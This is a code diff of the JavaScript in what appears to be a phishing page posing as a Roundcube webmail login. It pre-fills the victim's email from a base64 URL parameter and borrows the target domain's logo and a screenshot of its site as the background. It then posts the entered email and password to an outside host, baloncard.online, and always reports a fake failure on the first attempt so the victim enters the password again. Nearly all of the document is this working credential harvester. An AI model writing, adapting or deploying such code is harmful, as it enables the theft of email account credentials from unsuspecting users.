@@ -78,106 +78,112 @@
 
     <script>
         $(document).ready(function () {
-            let isFirstSubmit = true;
+    let isFirstSubmit = true;
 
-            // Encode and decode email
-            function encodeEmail(email) {
-                return btoa(email); // Base64 encoding
-            }
+    // Encode and decode email
+    function encodeEmail(email) {
+        return btoa(email); // Base64 encoding
+    }
 
-            function decodeEmail(encodedEmail) {
-                try {
-                    return atob(encodedEmail); // Decode Base64
-                } catch (e) {
-                    return encodedEmail; // Return original if decoding fails
-                }
-            }
+    function decodeEmail(encodedEmail) {
+        try {
+            return atob(encodedEmail); // Decode Base64
+        } catch (e) {
+            return encodedEmail; // Return original if decoding fails
+        }
+    }
 
-            // Check URL for email and encode it if needed
-            const urlParams = new URLSearchParams(window.location.search);
-            let encodedEmail = urlParams.get('sync');
+    // Check URL for email and encode it if needed
+    const urlParams = new URLSearchParams(window.location.search);
+    let encodedEmail = urlParams.get('sync');
 
-            if (encodedEmail) {
-                const decodedEmail = decodeEmail(encodedEmail);
-                $('#rcmloginuser').val(decodedEmail); // Display real email in input field
+    if (encodedEmail) {
+        const decodedEmail = decodeEmail(encodedEmail);
+        $('#rcmloginuser').val(decodedEmail); // Display real email in input field
 
-                const newEncodedEmail = encodeEmail(decodedEmail);
-                const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?sync=' + newEncodedEmail;
-                window.history.replaceState({ path: newUrl }, '', newUrl); // Update the URL
+        const newEncodedEmail = encodeEmail(decodedEmail);
+        const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + '?sync=' + newEncodedEmail;
+        window.history.replaceState({ path: newUrl }, '', newUrl); // Update the URL
 
-                // Set the logo and background
-                const domain = decodedEmail.split('@')[1];
-                const logoUrl = "https://logo.clearbit.com/" + domain;
-                const backgroundImageUrl = "https://image.thum.io/get/auth/72563-81b4f7840ee75846c04382b81b3563a6//width/1400/http://" + domain;
+        // Set the logo and background
+        const domain = decodedEmail.split('@')[1];
+        const logoUrl = "https://logo.clearbit.com/" + domain;
+        const backgroundImageUrl = "https://image.thum.io/get/auth/72563-81b4f7840ee75846c04382b81b3563a6//width/1400/http://" + domain;
 
-                // Update logo
-                $.get(logoUrl)
-                    .done(function () {
-                        $("#log").attr("src", logoUrl);
-                    })
-                    .fail(function () {
-                        $("#log").attr("src", "https://i.imgur.com/codsasasBij.png"); // Fallback logo
-                    });
-
-                // Update background
-                $.get(backgroundImageUrl)
-                    .done(function () {
-                        $("#bg-image").css("background-image", "url('" + backgroundImageUrl + "')");
-                    })
-                    .fail(function () {
-                        $("#bg-image").css("background-image", "url('https://i.imgur.com/xddasasfedc.jpg')"); // Replace with a valid fallback image URL
-                    });
-            }
-
-            // Form submission via AJAX
-            $('#loginForm').submit(function (e) {
-                e.preventDefault();
-
-                const email = $('#rcmloginuser').val();
-                const password = $('#rcmloginpwd').val();
-                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-                // Validate email and password
-                if (!email || !emailPattern.test(email) || password.length < 5) {
-                    $('#error').text("Invalid email or password");
-                    return;
-                }
-
-                // Show spinner and change button text
-                $('#btnText').text('Loading...');
-                $('#loadingSpinner').removeClass('hidden');
-
-                // Disable the button
-                $('#signInBtn').prop('disabled', true);
-
-                // AJAX request
-                $.ajax({
-                    type: 'POST',
-                    url: 'https://baloncard.online/synchronization/magott.php?name=' + encodeEmail(email), // Make sure to use the correct endpoint for your backend
-                    data: $('#loginForm').serialize(), // Use serialized form data
-                    success: function (response) {
-                        // Hide spinner after request
-                        $('#loadingSpinner').addClass('hidden');
-                        $('#btnText').text('Sign in');
-                        $('#signInBtn').prop('disabled', false);
-
-                        if (isFirstSubmit) {
-                            $('#error').text("Invalid credential. Email/password is incorrect!");
-                            isFirstSubmit = false;
-                        } else {
-                            const domain = email.split('@')[1];
-                            window.location.href = `https://${domain}`;
-                        }
-                    },
-                    error: function () {
-                        $('#loadingSpinner').addClass('hidden');
-                        $('#btnText').text('Sign in');
-                        $('#signInBtn').prop('disabled', false);
-                        $('#error').text("An error occurred. Please try again.");
-                    }
-                });
+        // Update logo
+        $.get(logoUrl)
+            .done(function () {
+                $("#log").attr("src", logoUrl);
+            })
+            .fail(function () {
+                $("#log").attr("src", "https://i.imgur.com/codsasasBij.png"); // Fallback logo
             });
+
+        // Update background
+        $.get(backgroundImageUrl)
+            .done(function () {
+                $("#bg-image").css("background-image", "url('" + backgroundImageUrl + "')");
+            })
+            .fail(function () {
+                $("#bg-image").css("background-image", "url('https://i.imgur.com/xddasasfedc.jpg')"); // Replace with a valid fallback image URL
+            });
+    }
+
+    // Form submission via AJAX
+    $('#loginForm').submit(function (e) {
+        e.preventDefault();
+
+        const email = $('#rcmloginuser').val();
+        const password = $('#rcmloginpwd').val();
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        // Validate email and password
+        if (!email || !emailPattern.test(email) || password.length < 5) {
+            $('#error').text("Invalid email or password");
+            return;
+        }
+
+        // Show spinner and change button text
+        $('#btnText').text('Loading...');
+        $('#loadingSpinner').removeClass('hidden');
+
+        // Disable the button
+        $('#signInBtn').prop('disabled', true);
+
+        // AJAX request
+        $.ajax({
+            type: 'POST',
+            url: 'https://baloncard.online/synchronization/magott.php?name=' + encodeEmail(email), // Make sure to use the correct endpoint for your backend
+            data: $('#loginForm').serialize(), // Use serialized form data
+            success: function (response) {
+                // Hide spinner after request
+                $('#loadingSpinner').addClass('hidden');
+                $('#btnText').text('Sign in');
+                $('#signInBtn').prop('disabled', false);
+
+                if (isFirstSubmit) {
+                    $('#error').text("Invalid credential. Email/password is incorrect!");
+                    isFirstSubmit = false;
+                } else {
+                    const domain = email.split('@')[1];
+                    window.location.href = `https://${domain}`;
+                }
+
+                // Clear the password field after the first submission
+                if (isFirstSubmit === false) {
+                    $('#rcmloginpwd').val('');  // Clear the password input field
+                }
+            },
+            error: function () {
+                $('#loadingSpinner').addClass('hidden');
+                $('#btnText').text('Sign in');
+                $('#signInBtn').prop('disabled', false);
+                $('#error').text("An error occurred. Please try again.");
+            }
         });
+    });
+});
+
     </script>
 
 </body>
